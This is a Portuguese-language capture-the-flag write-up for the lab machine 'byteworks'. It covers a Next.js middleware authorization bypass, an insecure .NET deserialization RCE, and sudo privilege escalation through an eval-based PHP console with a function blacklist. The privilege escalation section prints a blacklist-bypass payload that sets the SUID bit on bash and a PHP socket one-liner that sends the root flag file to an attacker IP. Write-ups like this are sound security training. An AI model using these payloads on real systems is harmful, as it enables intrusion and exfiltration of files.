# writeup: byteworks, hard, 700xp

## vulns: `CVE-2025-29927`, `information disclousure`, `desserialização insegura .net`, `privesc SUDO`

## 1️⃣ recon

- numa primeira olhada, parecia ser uma aplicação de divulgação de projetos freelance, mas não redirecionava pra nenhum vhost e não encontrei nada no fuzzing, então, rolando a página vi um email cujo dominio era `byteworks.hc`, então adicionei no meu `/etc/hosts` e parti pro fuzzing de subdominios
    
    <img width="1607" height="772" alt="image" src="https://github.com/user-attachments/assets/cf6c3532-b64d-4268-95ad-64dc262e367c" />
    
- fuzzing:
  
    <img width="954" height="552" alt="image" src="https://github.com/user-attachments/assets/e4684380-16ed-47a3-8642-212a1bacdff7" />
   
- em `chat.byteworks.hc`, de novo, nao encontrei nada no fuzzing, só o endpoint `dashboard/`, que redirecionava pra uma página de login, e a autenticação era feita a partir de chamadas de api. a principio pensei que se tratava  de um `sqli`, mas dando uma olhada nos frameworks utilizados pela aplicação, vi que ela usava o `next.js v15.0.0`
- buscando por [artigos](https://zeropath.com/blog/nextjs-middleware-cve-2025-29927-auth-bypass) sobre vulnerabilidades nesa versão, vi que havia saído uma `CVE` há 2 meses atrás, registrando uma vulnerabilidade nessa versão no framework, que permite ao atacante bypassar os middlewares de autorização da aplicação. dessa forma, podemos acessar a `dashboard/` sem estarmos autenticados
- usando o match and replace do burp pra carregar o header com o bypass:
    
   <img width="858" height="724" alt="image" src="https://github.com/user-attachments/assets/1d665ee7-317e-44a0-a407-b0dbf0030ad7" />


## 2️⃣ fuzzing

- em posse das credenciais do `gitea`, podemos acessá-lo. vemos que existe um repositório chamado `BookStore`, que aparentemente é um protótipo de uma aplicação pra um e-commerce de livros, escrito em `.NET 7.0`

    <img width="1354" height="713" alt="image" src="https://github.com/user-attachments/assets/d0010d26-d58f-49bd-99a4-fbe034244101" />

- a aplicação é somente interna, vemos seu vhost:

   <img width="1012" height="667" alt="image" src="https://github.com/user-attachments/assets/764bca45-ca02-44b7-b38e-9fb080010dd7" />
  
- podemos ver que boa parte dos recursos da aplicação já foram implementados, então, em posse do seu código fonte, podemos fazer o code review em busca de vulnerabilidades
- no code review, além do `TypeNameHandling` ativo, notamos que o endpoint `/Cart/RestoreCart` faz a desserialização dos objetos `json` que são enviados no corpo das requisições, ou seja, estamos diante de uma desserialização insegura em `.net`

    <img width="1021" height="670" alt="image" src="https://github.com/user-attachments/assets/2433ad03-aba3-41fd-9239-28bfcea34382" />

## 3️⃣ rce

- volte e reveja a aula de desserialização insegura em `.net`

  <img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/e6ddcdc2-6f4b-44f9-8e71-4e652ca74bfd" />
   
- com o acesso dentro da máquina, conseguimos nossa primeira flag

## 4️⃣ privesc

- ao ver quais comandos podem ser executados como sudo na máquina, usando `sudo -l`, vemos que podemos executar um script em `php` como o usuário root
    
    <img width="952" height="286" alt="image" src="https://github.com/user-attachments/assets/26f67aa9-5581-487f-a980-a6bb07397aa2" />
    
- `/opt/byteworks/byteworks_console.php`
    
    ```php
    <?php
    
    echo "==============================\n";
    echo "   Byteworks Dev Console\n";
    echo "   Internal Developer Shell\n";
    echo "==============================\n";
    
    $applications = [
        'dev' => ['UserAPI' => 'OK', 'BillingService' => 'WARNING', 'Chatbot' => 'OK'],
        'staging' => ['UserAPI' => 'OK', 'BillingService' => 'OK', 'Chatbot' => 'DEPLOYING'],
        'prod' => ['UserAPI' => 'OK', 'BillingService' => 'OK', 'Chatbot' => 'OK'],
    ];
    
    while (true) {
        echo "\n[byteworks@dev-console]$ ";
        $input = readline();
    
        if (trim($input) === "help") {
            echo "Available commands:\n";
            echo "  help           - Show this help message\n";
            echo "  info           - Display information about Byteworks\n";
            echo "  apps           - List monitored environments\n";
            echo "  status <env>   - Show application status for an environment\n";
            echo "  exit           - Exit the console\n";
            continue;
        }
    
        if (trim($input) === "info") {
            echo "Byteworks - Agile and Secure Software Solutions\n";
            echo "Website: http://byteworks.hc\n";
            echo "Focus: Web Platforms, DevSecOps, APIs\n";
            continue;
        }
    
        if (trim($input) === "apps") {
            echo "Environments being monitored:\n";
            echo "  - dev\n";
            echo "  - staging\n";
            echo "  - prod\n";
            continue;
        }
    
        if (str_starts_with($input, "status ")) {
            $parts = explode(" ", $input);
            $env = $parts[1] ?? "";
    
            if (!array_key_exists($env, $applications)) {
                echo "Unknown environment: '$env'. Try: dev, staging, prod.\n";
                continue;
            }
    
            echo "Application status for environment '$env':\n";
            foreach ($applications[$env] as $app => $status) {
                echo "  $app: $status\n";
            }
            continue;
        }
    
        if (trim($input) === "exit") {
            echo "Exiting console...\n";
            break;
        }
    
        $blacklist = [
            'system', 'shell_exec', 'exec', 'passthru', 'popen',
            'proc_open', 'file_get_contents', 'file_put_contents',
            'include', 'require'
        ];
    
        foreach ($blacklist as $function) {
            if (str_contains($input, $function)) {
                die("BLOCKED: Use of restricted function '$function'\n");
            }
        }
    
        try {
            eval($input);
        } catch (Error $e) {
            echo "ERROR: " . $e->getMessage() . "\n";
        }
    }
    ```
    
- vemos que é um console que exibe informações sobre a aplicação, e executa algumas funções do `php`, mas as mais interessantes estão bloqueadas, e além disso, desativadas no `php.ini`, descobri isso tentando bypassar o filtro da forma classica:
    
    ```php
     ($f='s'.'ystem') && $f('chmod u+s /bin/bash'); 
    ```
    
- com isso, listei as funções que ainda estavam habilitadas, e vi que todas da familia `socket` estavam funcionando, mas, como funções como `system()`, `shell_exec()`, e até algumas para leitura de arquivos como `require()` estão desabilitadas, precisei recorrer à uma função que eu nem conhecia: `highlight_file()`, que ativa o syntax highlighting de algum arquivo, e por conseguinte, lê o arquivo
- logo, a ideia era abrir um socket com minha máquina, e enviar o conteudo de `/root/root.txt`
    
    ```php
    ($s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP))&&socket_connect($s,"10.0.20.139",1338)&&socket_write($s,highlight_file("/root/root.txt",true));
    ```
    
    <img width="1753" height="560" alt="image" src="https://github.com/user-attachments/assets/0b737e2c-867e-4025-aa42-3b4e4856ae76" />
